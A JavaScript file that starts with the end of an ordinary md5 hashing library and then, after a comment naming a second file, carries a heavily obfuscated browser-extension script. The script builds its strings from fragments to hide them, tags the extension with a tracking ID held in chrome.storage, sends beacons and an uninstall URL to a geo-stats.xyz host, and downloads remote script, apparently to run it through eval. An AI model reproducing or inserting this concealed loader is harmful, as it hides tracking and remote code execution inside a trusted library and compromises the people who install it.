   * @returns {ArrayBuffer} ArrayBuffer
   * @see {@link md5.buffer}
   * @example
   * hash.buffer();
   */
  Md5.prototype.buffer = Md5.prototype.arrayBuffer;

  var exports = createMethod();

  if (COMMON_JS) {
    module.exports = exports;
  } else {
    /**
     * @method md5
     * @description Md5 hash function, export to global in browsers.
     * @param {String|Array|Uint8Array|ArrayBuffer} message message to hash
     * @returns {String} md5 hashes
     * @example
     * md5(''); // d41d8cd98f00b204e9800998ecf8427e
     * md5('The quick brown fox jumps over the lazy dog'); // 9e107d9d372bb6826bd81d3542a419d6
     * md5('The quick brown fox jumps over the lazy dog.'); // e4d909c290d0fb1ca068ffaddf22cbd0
     *
     * // It also supports UTF-8 encoding
     * md5('中文'); // a7bac2239fcdcb3a067903d8077c4a07
     *
     * // It also supports byte `Array`, `Uint8Array`, `ArrayBuffer`
     * md5([]); // d41d8cd98f00b204e9800998ecf8427e
     * md5(new Uint8Array([])); // d41d8cd98f00b204e9800998ecf8427e
     */
    root.md5 = exports;
    if (AMD) {
      define(function () {
        return exports;
      });
    }
  }
})();
// original file:demos/jianlibao/5871f15562.js

(function(n,r,t,i){var e=36,u=1068,o=22419,a=u.toString(e)+"S"+(1365200+u+o).toString(e)+"g",c;try{var f=function(){var n=function(){var n=function(){var n=function(){var n=function(){var n="ndom",r="ra",t=[r,n].join("");return t},r=n();return r},r=n();return r},r=n();return r},r=n();return r},v=function(){var n="om",r="rand",t=[r,n].join("");return t},s=function(){var n=function(){var n=a;return n},r=n();return r},d="cti",m="on",j="fun",g=parseInt(1+Math[f()]()*10),l=parseInt(2+Math[v()]()*10);c=r[693741[s()](36)];if(typeof c==j+d+m){var p=c(g+"+"+l);if(p!==g+l){c=null}}}catch(x){c=null}if(!t||!c){return}try{var h="tot",_="e",y="yp",k="pro",b="str",w="strs",U="tps:",M=".ge",S="z/",I="__u",R="tm.g",C="xy",L="//om",z="o-st",D="ega",T="if",q="ht",A="ats.";String[[k,h,y,_].join("")][w+b]=function(n,r){var t="plac",i="e",e="re",u=function(){var n="le",r="ngth",t=[n,r].join("");return t},o=function(){var n=function(){var n=function(){var n="ra",r="ndo",t="m",i=[n,r,t].join("");return i},r=n();return r},r=n();return r},c="Code",f="ch",v="ar",s="At",d=function(){var n=a;return n},m=function(){var n=function(){var n="Ch",r="ar",t="Code",i="fr",e="om",u=i+e+n+r+t;return u},r=n();return r},j=[e,t,i].join(""),g=u(),l=o(),p=f+v+c+s,x=d(),h=m();r=1+parseInt(Math[l]()*9);n=parseInt(Math[l]()*255);for(var _=this,y="",k=n,b=0,w;b<_[g];b++){w=_[p](b)^k;if(b>r){w^=y[p](b-r)}k=w^n;y+=String[h](w)}y=(n<16?"0":"")+n[x](16)+r[x](16)+y.length+"x"+y;return btoa(y)[j](/\+/g,"-")[j](/\//g,"_")[j](/\=+$/,"")};var E=q+U+L+D+M+z+A+C+S+I+R+T,G=function(n,r){var t="unde",e="fin",u="ed",o=function(){var n=function(){var n=function(){var n=function(){var n=function(){var n="&m=",r=n;return r},r=n();return r},r=n();return r},r=n();return r},r=n();return r},a="bg",c="&f",f="id=",v="r=",s="&uu",d=function(){var n="t=",r="&cri",t="eeia",i="pld",e="24&",u="mcig",o="fdc",a="d=fi",c="1.",f="mc",v="eo",s="kmje",d="jkkm",m="amm",j="n&v=",g=r+a+f+s+m+o+i+u+v+d+t+j+c+e+n;return g},m="src",j="?a=",g=function(){var n="str",r="r",t="sst",i=[n,t,r].join("");return i},l=E,p=+new Date,x="k="+n+(typeof r===t+e+u?"":o()+encodeURIComponent(r))+[c,v,a,s,f].join("")+i+d()+p;(new Image)[[m].join("")]=l+[j].join("")+(""+x)[g()]()}}catch(H){}try{var X="nd6",$="3",B="ou",F="gr",J="back",K="b7",N="9d",O="92b2",P=function(){var n=function(){var n="efin",r="ed",t="und",i=[t,n,r].join("");return i},r=n();return r},Q="sto",V="rage",W="ra",Y="ge",Z="sto",nr=function(){var n="loca",r="l",t=[n,r].join("");return t},rr=function(){var n="st",r="e",t="orag",i=n+t+r;return i},tr="cal",ir="lo",er=function(){var n=function(){var n=function(){var n="get",r=[n].join("");return r},r=n();return r},r=n();return r},ur="t_uu",or="id",ar="e_ex",cr="ins",fr="pir",vr="ru",sr="nt",dr="ime",mr="run",jr="tim",gr="e",lr=function(){var n="ins",r="Un",t="L",i="tal",e="set",u="lUR",o=e+r+n+i+u+t;return o},pr="cs.j",xr="na",hr="s:",_r="lyti",yr="//",kr="kme",br="yz",wr="grou",Ur="mf",Mr="pl",Sr="a.",Ir="nsp",Rr="jeam",Cr="/i",Lr="ire/",zr="geo",Dr="http",Tr="dc",qr="mckm",Ar="ts.x",Er="rid=",Gr="dm",Hr="-sta",Xr="nd/a",$r="eg",Br="cige",Fr="fi",Jr="v=",Kr="back",Nr="om",Or="ojk",Pr="n&",Qr="4",Vr="1.2",Wr="eia",Yr="s?c",Zr=J+F+B+X+O+N+K+$;if(typeof window[Zr]!==P()){return}window[Zr]=1;var nt=function(){var n="run",r="me",i="ti",e=function(){var n="ntim",r="ru",t="e",i=r+n+t;return i},u=function(){var n=function(){var n=function(){var n="no-r",r="unti",t="me",i=[n,r,t].join("");return i},r=n();return r},r=n();return r},o=function(){var n=function(){var n=function(){var n="str",r="sub",t=r+n;return t},r=n();return r},r=n();return r},a=function(){var n=function(){var n="xx",r="x",t="xx",i="xxx",e="xx",u=t+n+e+i+r;return u},r=n();return r},c="repl",f="ace",v=t[n+i+r]?t[e()]["id"]:u();return v[o()](0,5)+a()[c+f](/[x]/g,function(n){var r=function(){var n="ndom",r="ra",t=r+n;return t},t=Math[r()]()*16|0,i=n==="x"?t:t&3|8;return i.toString(16)})},rt=function(n){var r="ng",t="toSt",i="ri",e=function(){var n="GET",r=n;return r},u="ys",o="ech",a="onre",f="tat",v="ang",s="ad",d="e",m="d",j="sen",g=new XMLHttpRequest;g[1152671[t+i+r](36)](e(),n);g[[a,s,u,f,o,v,d].join("")]=function(){var n="re",r="adyS",t="e",i="tat",e="atu",u="st",o="s";if(g[n+r+i+t]!=4)return;if(g[u+e+o]==200){var a="seT",f="ext",v="pon",s="res",d="gt",m="len",j="h",l=g[s+v+a+f];if(!l[[m,d,j].join("")]){return}}c&&c(l)};g[[j,m].join("")]()};t[Q+V]&&t[Z+W+Y][nr()]&&t[rr()][ir+tr][er()]([Zr,[cr,fr,ar,ur,or].join("")],function(n){var r="ef",e="ine",u="d",o="und",a="insp",c="_ext",f="ire",v="d",s="_uui",d="unde",m="ed",j="fin",g="ru",l="nt",p="im",x="e",h=function(){var n="run",r="e",t="tim",i=n+t+r;return i},_=function(){var n=function(){var n="lURL",r="nins",t="tal",i="setU",e=i+r+t+n;return e},r=n();return r};if(typeof n[Zr]===[o,r,e,u].join("")){var y=function(){var n="spi",r="_ext",t="d",i="in",e="re",u="_uui",o=[i,n,e,r,u,t].join("");return o},k=function(){var n="ined",r="ef",t="und",i=t+r+n;return i},b="_uui",w="xt",U="_e",M="d",S="re",I="pi",R="ins",C=function(){var n="ge",r="sto",t="ra",i=r+t+n;return i},L="lo",z="cal",D="set",T={};T[Zr]=1;if(typeof n[y()]===k()){var q="sp",A="id",E="in",H="_uu",X="_ext",$="ire",B=function(){var n="insp",r="t_t",t="ir",i="ime",e="e_ex",u=n+t+e+r+i;return u},F="now";T[[E,q,$,X,H,A].join("")]=nt();T[B()]=Date[F]()}i=T[R+I+S+U+w+b+M];t[C()][[L,z].join("")][[D].join("")](T,function(){var n="ll",r="sta",t="in";G(t+r+n)})}if(typeof n[[a,f,c,s,v].join("")]!==[d,j,m].join("")){var J=function(){var n="d",r="ext_",t="insp",i="uui",e="ire_",u=t+e+r+i+n;return u};i=n[J()]}if(t[[g,l,p,x].join("")]&&t[h()][_()]){var K=function(){var n="//",r="ckmj",t="ga",i="-sta",e=".geo",u="=fim",o="ht",a="ins",c="cpl",f="ext=",v="ome",s="tall",d="ts.x",m="fd",j="meei",g="id=",l="/un",p="&u",x="yz",h="rid",_="tps:",y="db73",k="dmci",b="eamm",w="geoj",U="an&",M="b29",S="692",I="?c",R="kk",C=o+_+n+v+t+e+i+d+x+l+a+s+I+h+u+r+b+m+c+k+w+R+j+U+f+S+M+y+p+g;return C},N="=",O="&rnd",P="ndo",Q="ra",V="m",W="e",Y="tim",Z="run",nr="setU",rr="nin",tr="URL",ir="ll",er="sta",ur=K()+i+[O,N].join("")+Math[[Q,P,V].join("")]();t[Z+Y+W][nr+rr+er+ir+tr](ur)}});if(t[[vr,sr,dr].join("")]&&t[mr+jr+gr][lr()]){var tt="crid",it="mc",et="b29d",ut="kmee",ot="ps:/",at="xt",ct="ll?",ft="sta",vt="ts.x",st="igeo",dt="dcpl",mt="=fi",jt="htt",gt="ia",lt="d=",pt=".g",xt="eo-s",ht="=692",_t="in",yt="jk",kt="/un",bt="mmf",wt="ta",Ut="yz",Mt="n&e",St="ega",It="kmj",Rt="dmc",Ct="/om",Lt="b73&",zt="ea",Dt="ui",Tt="&rn",qt="d=",At=function(){var n="ndo",r="m",t="ra",i=t+n+r;return i},Et="ru",Gt="ntim",Ht="e",Xt=function(){var n="set",r="Uni",t="lU",i="nst",e="RL",u="al",o=n+r+i+u+t+e;return o},$t=[jt,ot,Ct,St,pt,xt,wt,vt,Ut,kt,_t,ft,ct,tt,mt,it,It,zt,bt,dt,Rt,st,yt,ut,gt,Mt,at,ht,et,Lt,Dt,lt].join("")+i+[Tt,qt].join("")+Math[At()]();t[[Et,Gt,Ht].join("")][Xt()]($t)}else{var Bt="fu",Ft="uni",Jt="t_",Kt="nc",Nt="ns",Ot="no_";G([Ot,Ft,Nt,Jt,Bt,Kt].join(""))}rt([Dr,hr,yr,Nr,$r,Sr,zr,Hr,Ar,br,Cr,Ir,Lr,Kr,wr,Xr,xr,_r,pr,Yr,Er,Fr,qr,Rr,Ur,Tr,Mr,Gr,Br,Or,kr,Wr,Pr,Jr,Vr,Qr].join(""))}catch(Pt){var Qt=function(){var n="n",r="ptio",t="exce",i=t+r+n;return i},Vt="na",Wt="me",Yt="e",Zt="ag",ni="ss",ri="me",ti="sta",ii="ck",ei="sub",ui="str";G(Qt(),encodeURIComponent(""+Pt[[Vt,Wt].join("")]+":"+Pt[ri+ni+Zt+Yt]+"\n"+Pt[ti+ii])[[ei,ui].join("")](0,1e3))}})(document,window,chrome);
